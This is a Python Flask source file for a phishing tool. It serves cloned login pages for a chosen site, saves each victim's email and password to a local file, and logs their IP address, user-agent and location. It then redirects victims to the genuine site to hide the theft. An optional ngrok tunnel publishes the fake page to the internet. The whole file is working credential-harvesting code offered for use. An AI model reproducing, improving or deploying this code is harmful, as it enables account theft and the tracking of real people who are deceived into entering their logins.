from flask import Flask, request, render_template, redirect
import time
from werkzeug.serving import make_server
import os, socket, os.path, requests
from pyngrok import ngrok
import threading

# Initializing necessary variables
phishing_tool_instance = None
app = Flask(__name__, template_folder="templates")
selected_site = ""
global server_stopped
victim_list = []

# Handling 404 error
@app.errorhandler(404)
def not_found(e):
    return redirect("https://www.google.com")

 # Handling login form submission
@app.route("/login", methods=["POST"])
def submit():
     # Capture email and password
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("pass")
        # Write victim's credentials to a file
        with open("captured.db", "a") as f:
            f.write(f"{selected_site}.com | ID: {email} | Password: {password}\n" + "-" * 100 + "\n")
        # Display victim's credentials
        phishing_tool_instance.update_output(f" [ * ] Victim {len(victim_list)} account id: {email}, password: {password}")
        phishing_tool_instance.update_output(" [ + ] Saved in captured.db")
        phishing_tool_instance.update_output(" [ * ] Waiting for other victim to open the link...")
        # Redirect to selected site
        return redirect(f"http://{selected_site}.com")
    # Render login page
    return render_template("index.html")

# Handling victim info request
@app.route("/", methods=["GET", "POST"])
def victimInfo():
    if request.method == "POST":
        victim_data = request.json
        if victim_data["status"] == "fail":
            pass
        else:
            victim_list.append(victim_data["ip"])
            # Display victim's info
            phishing_tool_instance.update_output(" [ * ] An victim found !")
            phishing_tool_instance.update_output(f" [ + ] Victim {len(victim_list)} IP: {victim_data['ip']}")
            phishing_tool_instance.update_output(f" [ + ] Victim {len(victim_list)} user-agent: {victim_data['useragent']}")
            phishing_tool_instance.update_output(f" [ + ] Victim {len(victim_list)} continent: {victim_data['continent_code']}")
            phishing_tool_instance.update_output(f" [ + ] Victim {len(victim_list)} country: {victim_data['country_name']}")
            phishing_tool_instance.update_output(f" [ + ] Victim {len(victim_list)} region: {victim_data['region']}")
            phishing_tool_instance.update_output(f" [ + ] Victim {len(victim_list)} city: {victim_data['city']}")
            phishing_tool_instance.update_output(f" [ + ] Victim {len(victim_list)} zip code: {victim_data['postal']}")
            phishing_tool_instance.update_output(f" [ + ] Victim {len(victim_list)} latitude and longitude: {victim_data['longitude']}, {victim_data['latitude']}")
            phishing_tool_instance.update_output(f" [ + ] Victim {len(victim_list)} ISP: {victim_data['org']}")
            phishing_tool_instance.update_output(" [ * ] Waiting for credentials...")
    # Render selected site's index page
    return render_template(f"{selected_site}/index.html")


class ServerManager:
    def __init__(self):
        self.server_stopped = threading.Event()
        self.app = None

    def start_server(self, port, update_output, ngrok_option, ngrok_auth_token, site):
        # Start the server
        update_output(" [ * ] Server started.")
        global selected_site
        selected_site = site

        app.debug = False
        # Display phishing site URL and local address
        update_output(f" [ * ] Phishing to: {site}")
        update_output(f" [ * ] Local address: http://{socket.gethostbyname(socket.gethostname())}:{port}")
        # Use Ngrok for public access if option is enabled
        if ngrok_option:
            if ngrok_auth_token:
                ngrok.set_auth_token(ngrok_auth_token)
            url = ngrok.connect(port, bind_tls=True).public_url
            update_output(f" [ * ] Ngrok public address: {url}")
        else:
            url = ""

        update_output(" [ * ] Server running.")
        update_output(" [ * ] Waiting for the victim to open the link...")

        server = make_server('0.0.0.0', int(port), app)
        server.timeout = 1
        # Handle server requests until it's stopped
        while not self.server_stopped.wait(1):
            server.handle_request()

    def stop_server(self):
        # Set server stopped flag
        self.server_stopped.set()
        
        
    if __name__ == '__main__':
         start_server(8080)
